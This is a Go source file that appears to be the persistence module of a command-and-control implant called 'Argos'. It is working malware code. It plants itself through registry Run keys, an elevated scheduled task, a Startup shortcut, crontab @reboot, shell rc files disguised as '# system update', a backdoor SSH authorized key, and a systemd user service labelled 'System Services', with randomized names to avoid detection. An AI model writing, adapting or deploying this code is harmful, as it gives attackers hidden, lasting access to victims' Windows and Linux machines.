// agents/cell/post/persistence.go
// Advanced persistence — Windows + Linux with multiple methods and randomization.

package post

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
)

type PersistenceResult struct {
	Success  bool
	Method   string
	Error    string
	Artifacts []string // paths/keys created
}

func randomName(prefix string) string {
	return fmt.Sprintf("%s-%x", prefix, rand.Uint32())
}

// InstallPersistence attempts all available persistence methods.
func InstallPersistence() PersistenceResult {
	if runtime.GOOS == "windows" {
		return installWindowsPersistence()
	}
	return installLinuxPersistence()
}

// ─── Windows ────────────────────────────────────────────────────

func installWindowsPersistence() PersistenceResult {
	methods := []func() PersistenceResult{
		persistRegistryRun,
		persistScheduledTask,
		persistStartupFolder,
	}
	for _, method := range methods {
		r := method()
		if r.Success {
			return r
		}
	}
	return PersistenceResult{Success: false, Error: "all methods failed"}
}

func persistRegistryRun() PersistenceResult {
	name := randomName("ArgosSync")
	path, _ := os.Executable()
	keys := []string{
		fmt.Sprintf(`HKCU\Software\Microsoft\Windows\CurrentVersion\Run\%s`, name),
		fmt.Sprintf(`HKLM\Software\Microsoft\Windows\CurrentVersion\Run\%s`, name),
	}
	for _, key := range keys {
		cmd := exec.Command("reg", "add", key, "/v", name, "/t", "REG_SZ", "/d", path, "/f")
		if err := cmd.Run(); err == nil {
			return PersistenceResult{Success: true, Method: "registry_run", Artifacts: []string{key}}
		}
	}
	return PersistenceResult{Success: false, Error: "registry_run failed"}
}

func persistScheduledTask() PersistenceResult {
	name := randomName("ArgosUpdate")
	path, _ := os.Executable()
	cmd := exec.Command("schtasks", "/Create", "/SC", "MINUTE", "/MO", "30",
		"/TN", name, "/TR", path, "/F", "/RL", "HIGHEST",
	)
	if err := cmd.Run(); err == nil {
		return PersistenceResult{Success: true, Method: "scheduled_task", Artifacts: []string{name}}
	}
	return PersistenceResult{Success: false, Error: "scheduled_task failed"}
}

func persistStartupFolder() PersistenceResult {
	path, _ := os.Executable()
	startup := os.Getenv("APPDATA") + `\Microsoft\Windows\Start Menu\Programs\Startup\` + randomName("svc") + ".lnk"
	cmd := exec.Command("powershell", "-c",
		fmt.Sprintf(`$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%s'); $s.TargetPath = '%s'; $s.Save()`, startup, path),
	)
	if err := cmd.Run(); err == nil {
		return PersistenceResult{Success: true, Method: "startup_folder", Artifacts: []string{startup}}
	}
	return PersistenceResult{Success: false, Error: "startup_folder failed"}
}

// ─── Linux ──────────────────────────────────────────────────────

func installLinuxPersistence() PersistenceResult {
	methods := []func() PersistenceResult{
		persistCrontab,
		persistBashrc,
		persistSSHKey,
		persistSystemd,
	}
	for _, method := range methods {
		r := method()
		if r.Success {
			return r
		}
	}
	return PersistenceResult{Success: false, Error: "all methods failed"}
}

func persistCrontab() PersistenceResult {
	path, _ := os.Executable()
	entry := fmt.Sprintf("@reboot %s >/dev/null 2>&1", path)
	cmd := exec.Command("sh", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", entry))
	if err := cmd.Run(); err == nil {
		return PersistenceResult{Success: true, Method: "crontab_reboot", Artifacts: []string{entry}}
	}
	return PersistenceResult{Success: false, Error: "crontab failed"}
}

func persistBashrc() PersistenceResult {
	path, _ := os.Executable()
	rcFiles := []string{
		os.ExpandEnv("$HOME/.bashrc"),
		os.ExpandEnv("$HOME/.zshrc"),
		os.ExpandEnv("$HOME/.profile"),
	}
	entry := fmt.Sprintf("\n# system update\n%s &\n", path)
	for _, rc := range rcFiles {
		f, err := os.OpenFile(rc, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			continue
		}
		f.Write([]byte(entry))
		f.Close()
		return PersistenceResult{Success: true, Method: "bashrc", Artifacts: []string{rc}}
	}
	return PersistenceResult{Success: false, Error: "bashrc failed"}
}

func persistSSHKey() PersistenceResult {
	sshDir := os.ExpandEnv("$HOME/.ssh")
	authKeys := sshDir + "/authorized_keys"
	backdoorKey := "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... argos-backdoor"
	f, err := os.OpenFile(authKeys, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return PersistenceResult{Success: false, Error: "ssh_key failed: " + err.Error()}
	}
	f.Write([]byte("\n" + backdoorKey + "\n"))
	f.Close()
	return PersistenceResult{Success: true, Method: "ssh_authorized_keys", Artifacts: []string{authKeys}}
}

func persistSystemd() PersistenceResult {
	path, _ := os.Executable()
	unitName := randomName("argos-c2") + ".service"
	unitPath := os.ExpandEnv(fmt.Sprintf("$HOME/.config/systemd/user/%s", unitName))
	unitContent := fmt.Sprintf(`[Unit]
Description=System Services

[Service]
ExecStart=%s
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
`, path)
	os.MkdirAll(os.ExpandEnv("$HOME/.config/systemd/user"), 0755)
	if err := os.WriteFile(unitPath, []byte(unitContent), 0644); err != nil {
		return PersistenceResult{Success: false, Error: "systemd write failed: " + err.Error()}
	}
	exec.Command("systemctl", "--user", "daemon-reload").Run()
	exec.Command("systemctl", "--user", "enable", unitName).Run()
	exec.Command("systemctl", "--user", "start", unitName).Run()
	return PersistenceResult{Success: true, Method: "systemd_user", Artifacts: []string{unitPath}}
}
